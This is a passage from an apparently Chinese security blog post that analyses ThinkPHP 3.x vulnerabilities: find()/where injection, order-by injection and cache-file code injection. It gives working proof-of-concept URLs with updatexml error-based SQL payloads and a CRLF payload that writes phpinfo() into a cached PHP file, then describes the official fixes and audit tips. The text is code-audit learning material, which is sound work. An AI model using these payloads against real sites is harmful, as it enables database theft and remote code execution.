class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_parseOptions</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br><span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$options</span>))<br><span class="hljs-variable">$options</span> =  array_merge(<span class="hljs-keyword">$this</span>-&gt;options,<span class="hljs-variable">$options</span>);<br>  ……<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$options</span>;<br></code></pre></td></tr></table></figure><p>现在sql语句可控了，能想到的是在数据库底层类中的parsewhere()方法解析where字段时，对字符串参数不会过滤，由下面代码，需要控制<code>$options[&#39;where&#39;]</code>为字符串类型即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseSql</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span>&#123;<br>  <span class="hljs-comment">// parseWhere()接收的是$options[&#x27;where&#x27;]</span><br><span class="hljs-keyword">$this</span>-&gt;parseWhere(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>)<br>    ……<br>      <br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseWhere</span>(<span class="hljs-params"><span class="hljs-variable">$where</span></span>) </span>&#123;<br>    <span class="hljs-variable">$whereStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$where</span>)) &#123;<br>    <span class="hljs-comment">// 直接使用字符串条件</span><br>        <span class="hljs-variable">$whereStr</span> = <span class="hljs-variable">$where</span>;<br>    ……<br></code></pre></td></tr></table></figure><h3 id="场景构造"><a href="#场景构造" class="headerlink" title="场景构造"></a>场景构造</h3><p>构造一个<code>find()</code>方法接收外部参数，这种写法可能存在漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-variable">$id</span> = I(<span class="hljs-string">&#x27;GET.id&#x27;</span>);<br>    <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>  <span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;find(<span class="hljs-variable">$id</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>poc如下，要传入id[‘where’]数组</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/home/index/test?id</span>[<span class="hljs-string">where</span>]=(1=1) and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+<br></code></pre></td></tr></table></figure><p>实际执行的sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">-- LIMIT 1</span><br></code></pre></td></tr></table></figure><h3 id="官方修复-1"><a href="#官方修复-1" class="headerlink" title="官方修复"></a>官方修复</h3><p>官方在修复上就是在 <code>_parseOptions()</code> 处忽略了外部传入的 <code>$options</code>，这样我们传入的数据只能用于主键查询，而主键查询最终会转换为数组格式，数组格式数据在后面也会被过滤，那么这个漏洞就不存在了</p><img src="img/ThinkPHP3.x 漏洞总结/image-20210729120607836.png" alt="image-20210729120607836" style="zoom:50%;" /><p>Model.class.php 类中 delete(), select() 方法具有相同问题，也在ThinkPHP3.2.4中被修复</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>可以看到ThinkPHP在处理sql查询时分的很细，做出了一个可控的主键查询这个功能，让用户可以控制主键查询的值，但始终保存主键查询的数据为数组形式可以被过滤，就保证了数据的安全性，但却忽略了一些意外的情况，导致sql注入。这个漏洞同样是需要很对ThinkPHP底层逻辑十分清楚</p><h2 id="order-by-注入漏洞"><a href="#order-by-注入漏洞" class="headerlink" title="order by 注入漏洞"></a>order by 注入漏洞</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>ThinkPHP的模型基类Model并没有直接提供order的方法，而是用 <code>__call()</code> 魔术方法来获取一些特殊方法的参数，代码如下：</p><blockquote><p>ThinkPHP/Library/Think/Model.class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  <span class="hljs-comment">// 查询表达式参数</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>          =   <span class="hljs-keyword">array</span>();<br>  <span class="hljs-comment">// 链操作方法列表</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$methods</span>          =   <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;strict&#x27;</span>,<span class="hljs-string">&#x27;order&#x27;</span>,<span class="hljs-string">&#x27;alias&#x27;</span>,<span class="hljs-string">&#x27;having&#x27;</span>,<span class="hljs-string">&#x27;group&#x27;</span>,……);<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(in_array(strtolower(<span class="hljs-variable">$method</span>),<span class="hljs-keyword">$this</span>-&gt;methods,<span class="hljs-literal">true</span>)) &#123;<br>            <span class="hljs-comment">// 连贯操作的实现</span><br>            <span class="hljs-keyword">$this</span>-&gt;options[strtolower(<span class="hljs-variable">$method</span>)] =   <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>;<br>        &#125;<br>    ……<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当调用模型对象的 order() 方法时，因为模型对象不具有order()便触发了 <code>__call()</code> 方法，在 <code>__call()</code> 方法中，传入order()方法的第一个参数 $arg[0] 将赋值给 <code>$this-&gt;options[&#39;order&#39;]</code></p><p>最终 options[‘order’] 将由给 parseOrder() 解析</p><blockquote><p>ThinkPHP/Library/Think/Db/Driver.class.php</p></blockquote><p>在 Thinkphp3.2.3 中 parseOrder() 实现的十分简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Driver</span> </span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseOrder</span>(<span class="hljs-params"><span class="hljs-variable">$order</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$order</span>)) &#123;<br>            <span class="hljs-variable">$array</span>   =  <span class="hljs-keyword">array</span>();<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$order</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>                <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$key</span>)) &#123;<br>                    <span class="hljs-variable">$array</span>[] =  <span class="hljs-keyword">$this</span>-&gt;parseKey(<span class="hljs-variable">$val</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$array</span>[] =  <span class="hljs-keyword">$this</span>-&gt;parseKey(<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable">$order</span>   =  implode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$array</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$order</span>)?  <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span>:<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>parseOrder()的参数 <code>$order</code> 来自 <code>$options[&#39;order&#39;]</code></li><li>过程对 <code>$order</code> 没有任何过滤，可以任意注入。。。</li></ul><h3 id="场景构造-1"><a href="#场景构造-1" class="headerlink" title="场景构造"></a>场景构造</h3><p>构造一个order参数可控的场景，不过似乎很少有程序会把查询排序的参数交给用户</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$order</span> = I(<span class="hljs-string">&#x27;GET.order&#x27;</span>);<br>    <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;order(<span class="hljs-variable">$order</span>)-&gt;find();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>poc：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://tp.test:<span class="hljs-number">8888</span>/home/index/test?order=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select%<span class="hljs-number">20</span>user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>实际执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="系统修复"><a href="#系统修复" class="headerlink" title="系统修复"></a>系统修复</h3><p>在看系统修复代码时发现，ThinkPHP3.2.4主要采用了判断输入中是否有括号的方式过滤，在ThinkPHP3.2.5中则用正则表达式过滤特殊符号。另外该在 ThinkPHP&lt;=5.1.22 版本也存在这样的漏洞，利用方式有一些不同</p><p>在复现该漏洞时发现其他博主的代码和我的不一样，我这里以官网下载的代码为准</p><h2 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h2><p>ThinkPHP 中提供了一个数据缓存的功能，对应<strong>S方法</strong>快捷方法，可以先将一些数据保存在文件中，再次访问该数据时直接访问缓存文件即可</p><h3 id="缓存文件示例"><a href="#缓存文件示例" class="headerlink" title="缓存文件示例"></a>缓存文件示例</h3><p>按照缓存初始化时候的参数进行缓存数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>  S(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-variable">$name</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下次在读取该值时通过缓存文件可以更快获取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cache</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-variable">$value</span> = S(<span class="hljs-string">&#x27;name&#x27;</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先访问test()，生成缓存数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp.test:<span class="hljs-number">8888</span><span class="hljs-regexp">/home/i</span>ndex/test?name=jelly<br></code></pre></td></tr></table></figure><p>发现生成文件：Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php</p><img src="img/ThinkPHP3.x 漏洞总结/image-20210729173556871.png" alt="image-20210729173556871" style="zoom:50%;" /><p>然后访问cache()，获取缓存数据</p><img src="img/ThinkPHP3.x 漏洞总结/image-20210729173745860.png" alt="image-20210729173745860" style="zoom:50%;" /><p>上面就是缓存文件生成和使用的过程</p><h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>具体分析一下 S 方法的代码是怎么产生漏洞的：</p><blockquote><p>ThinkPHP/Common/functions.php</p></blockquote><p>S方法会实例化一个$cache对象，$cache对象具有查看缓存，删除缓存和写缓存的动能，这里我们只关注写缓存的 set() 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">S</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$options</span>=<span class="hljs-literal">null</span></span>) </span>&#123;<br>  <span class="hljs-comment">// 缓存初始化</span><br>  <span class="hljs-variable">$cache</span> = Think\Cache::getInstance();<br>  <span class="hljs-comment">//具体缓存操作</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;&#x27;</span>=== <span class="hljs-variable">$value</span>)&#123; <span class="hljs-comment">// 获取缓存</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache</span>-&gt;get(<span class="hljs-variable">$name</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(is_null(<span class="hljs-variable">$value</span>)) &#123; <span class="hljs-comment">// 删除缓存</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache</span>-&gt;rm(<span class="hljs-variable">$name</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 缓存数据</span><br>        <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$options</span>)) &#123;<br>            <span class="hljs-variable">$expire</span>     =   <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;expire&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;expire&#x27;</span>]:<span class="hljs-literal">NULL</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$expire</span>     =   is_numeric(<span class="hljs-variable">$options</span>)?<span class="hljs-variable">$options</span>:<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache</span>-&gt;set(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ThinkPHP/Library/Think/Cache/Driver/File.class.php</p></blockquote><ul><li>先看 <code>file_put_contents()</code> ，就是这里写入了文件，我们需要控制其中的两个参数，文件名 <code>$filename</code>, 写入数据 <code>$data</code></li><li>文件名 <code>$filename</code>来自方法<code>filename($name)</code>，其中<code>$name</code>为S方法的外部参数，如果该参数可控，可能会导致文件名被控制，filename()是怎么操作的等下细看</li><li>写入数据 <code>$data</code> 来自<code>$value</code> 处理后的数据，<code>$value</code> 可控<ul><li><code>$value</code> 先经过序列化</li><li>然后使用 <code>&lt;?php\n//</code>, <code>?&gt;</code> 包裹 $value 序列化后的值，这是要写入一个php文件呀，危险！注意这里使用了行注释符<code>//</code>，保证写入的数据不会被解析，但是我们可以通过换行符等手段轻松绕过</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Cache</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span>,<span class="hljs-variable">$expire</span>=<span class="hljs-literal">null</span></span>) </span>&#123;<br>        ……<br>        <span class="hljs-variable">$filename</span>   =   <span class="hljs-keyword">$this</span>-&gt;filename(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-variable">$data</span>   =   serialize(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-variable">$data</span>    = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span>.sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>,<span class="hljs-variable">$expire</span>).<span class="hljs-variable">$check</span>.<span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n?&gt;&quot;</span>;<br>        <span class="hljs-variable">$result</span>  =   file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;length&#x27;</span>]&gt;<span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 记录缓存队列</span><br>                <span class="hljs-keyword">$this</span>-&gt;queue(<span class="hljs-variable">$name</span>);<br>            &#125;<br>            clearstatcache();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>下面关注一下文件的命名方式，具体方法为filename()</p><ul><li><code>C(&#39;DATA_CACHE_KEY&#39;)</code> 就是获取配置文件中 DATA_CACHE_KEY 的值，==该值默认为空。该值为空时，<code>$name</code> 最终的md5加密值也就清楚了==</li><li><code>$this-&gt;options[&#39;prefix&#39;]</code> 默认为空，最终的文件名则将由<code>$this-&gt;options[&#39;temp&#39;]</code> 决定</li><li><code>$this-&gt;options[&#39;temp&#39;]</code> 默认为 <code>Application/Runtime/Temp</code></li><li>所以在默认情况下，写入缓存的文件名应该为：<code>Application/Runtime/Temp/md5($name)</code>，<code>$name</code>为S方法外部参数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filename</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>    <span class="hljs-variable">$name</span>=md5(C(<span class="hljs-string">&#x27;DATA_CACHE_KEY&#x27;</span>).<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">if</span>(C(<span class="hljs-string">&#x27;DATA_CACHE_SUBDIR&#x27;</span>)) &#123;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$filename</span>=<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>].<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;temp&#x27;</span>].<span class="hljs-variable">$filename</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>poc如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//tp.test:8888/home/index/test?name=%0d%0aphpinfo();%0d%0a//</span><br></code></pre></td></tr></table></figure><blockquote><p>0x0d - \r, carrige return    回车</p><p>0x0a - \n, new line            换行</p><p>Windows 中换行为0d 0a，UNIX 换行为 0a</p></blockquote><p>参数名 name 决定泄露缓存文件名，md5(name)=b068931cc450442b63f5b3d276ea4297，文件名则为：b068931cc450442b63f5b3d276ea4297.php，默认目录为Application/Runtime/Temp，然后访问我们的php文件</p><img src="img/ThinkPHP3.x 漏洞总结/image-20210729185856826.png" alt="image-20210729185856826" style="zoom:50%;" /><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>利用该漏洞需要文件名完全可控，所以得知道程序定义DATA_CACHE_KEY和options[‘prefix’]，好在这两个参数默认为空。不过利用该漏洞需要知道程序在哪里使用了S方法，且S方法的参数可控，所以该漏洞基本只能通过代码审计找出，如果有了程序的源代码，那么文件名就更不是问题了</p><p>另外需要注意的是该漏洞被利用的另外一个原因 TP3 不安全的 web 目录部署，导致生成的缓存文件是可以直接访问的，在 TP5 一些版本中也有这个漏洞，但是 TP5 的 web 目录部署更加安全，这个漏洞并一定能利用</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文主要总结了在审计 TP3 框架的代码时应该注意的点，在 TP3 框架基础知识上应该知道路由处理，快捷方法，模型的运作等，在漏洞审计方面应该知道哪些不规范的写法可能会造成漏洞，另外通过复现 TP3 历史漏洞知道，即使是规范的写法也是可能存在漏洞的。</p><p>本文篇幅较大，为了方便日后审计 TP 3的代码，这里简单总结下 TP3 的漏洞审计，至于没有提到的点，通过正常的代码审计方法也能正常审计 TP3 的代码，该部分根据日后的经验持续完善</p><h2 id="sql注入漏洞总结"><a href="#sql注入漏洞总结" class="headerlink" title="sql注入漏洞总结"></a>sql注入漏洞总结</h2><p>以下面的sql语句为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> AAA <span class="hljs-keyword">FROM</span> `BBB` <span class="hljs-keyword">WHERE</span> `CCC`<span class="hljs-operator">=</span><span class="hljs-string">&#x27;DDD&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> EEE LIMI <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>其中’xxx’的字符都有可能通过外部数据可控，在 TP3 中各字段由以下方法控制</p><table><thead><tr><th>字段</th><th>方法</th></tr></thead><tbody><tr><td>AAA</td><td>field()</td></tr><tr><td>BBB</td><td>table()</td></tr><tr><td>CCC</td><td>where()</td></tr><tr><td>DDD</td><td>where()</td></tr><tr><td>EEE</td><td>order()</td></tr></tbody></table><p>在代码审计时主要关注该版本是否存在漏洞，这些方法的写法是否规范</p><p>1）没有按官方要求传入参数</p><p>使用双引号解析参数基本都会绕过tp的过滤，下面发现where()就有这样的情况，其他方法应该也有，在这种情况下即使使用了I方法也没有用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;username=&#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>)-&gt;select();<br></code></pre></td></tr></table></figure><p>2）没有使用 <strong>I方法</strong> 接收外部参数</p><p>虽然sql过滤不是在I方法中，但如果没有使用I方法接收参数，可能会让数据绕过底层的过滤。</p><p>如下没有使用I方法，通过注入bind的数组值会进入tp3处理bind数据的逻辑，从而绕过过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;save(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>3）tp3存在sql注入漏洞</p><p>利用现有漏洞，即使程序使用了规范的写法也有可能存在漏洞。该点需要注意TP3的版本，在TP3.2.3及以前的版本基本存在漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// save() 注入漏洞</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;jop&#x27;</span>] = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;save(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">// delete(),find(),selsect() 注入漏洞</span><br><span class="hljs-variable">$id</span> = I(<span class="hljs-string">&#x27;GET.id&#x27;</span>);<br><span class="hljs-variable">$User</span> = M(<span 